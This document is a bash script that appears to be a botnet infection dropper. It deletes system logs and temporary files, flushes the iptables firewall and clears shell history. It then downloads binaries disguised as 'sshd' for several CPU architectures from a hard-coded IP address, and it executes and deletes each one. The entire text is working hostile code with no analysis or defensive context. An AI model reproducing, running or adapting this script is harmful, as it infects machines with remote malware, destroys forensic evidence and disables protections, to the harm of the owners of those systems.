#!/bin/bash
rm -rf /var/log/*
rm -rf /var/log/apache/*
rm -rf /var/log/apache2/*
rm -rf /etc/httpd/logs/*
rm -rf /var/tmp/*
rm -rf /tmp/*
rm -rf *.x86
rm -rf *.mips
rm -rf *.mpsl
rm -rf *.arm
rm -rf *.arm5
rm -rf *.arm6
rm -rf *.arm7
rm -rf *.ppc
rm -rf *.spc
rm -rf *.m68k
rm -rf *.sh4
iptables -F
history -c
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://135.148.91.146:1980/sshd.mips -o sshd.mips; wget http://135.148.91.146:1980/sshd.mips; chmod +x sshd.mips; ./sshd.mips; rm -rf sshd.mips
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://135.148.91.146:1980/sshd.mpsl -o sshd.mpsl; wget http://135.148.91.146:1980/sshd.mpsl; chmod +x sshd.mpsl; ./sshd.mpsl; rm -rf sshd.mpsl
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://135.148.91.146:1980/sshd.x86 -o sshd.x86; wget http://135.148.91.146:1980/sshd.x86; chmod +x sshd.x86; ./sshd.x86; rm -rf sshd.x86
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://135.148.91.146:1980/sshd.ppc -o sshd.ppc; wget http://135.148.91.146:1980/sshd.ppc; chmod +x sshd.ppc; ./sshd.ppc; rm -rf sshd.ppc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://135.148.91.146:1980/sshd.sparc -o sshd.sparc; wget http://135.148.91.146:1980/sshd.sparc; chmod +x sshd.sparc; ./sshd.sparc; rm -rf sshd.sparc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://135.148.91.146:1980/sshd.arm4 -o sshd.arm4; wget http://135.148.91.146:1980/sshd.arm4; chmod +x sshd.arm4; ./sshd.arm4; rm -rf sshd.arm4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://135.148.91.146:1980/sshd.arm5 -o sshd.arm5; wget http://135.148.91.146:1980/sshd.arm5; chmod +x sshd.arm5; ./sshd.arm5; rm -rf sshd.arm5
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://135.148.91.146:1980/sshd.arm6 -o sshd.arm6; wget http://135.148.91.146:1980/sshd.arm6; chmod +x sshd.arm6; ./sshd.arm6; rm -rf sshd.arm6
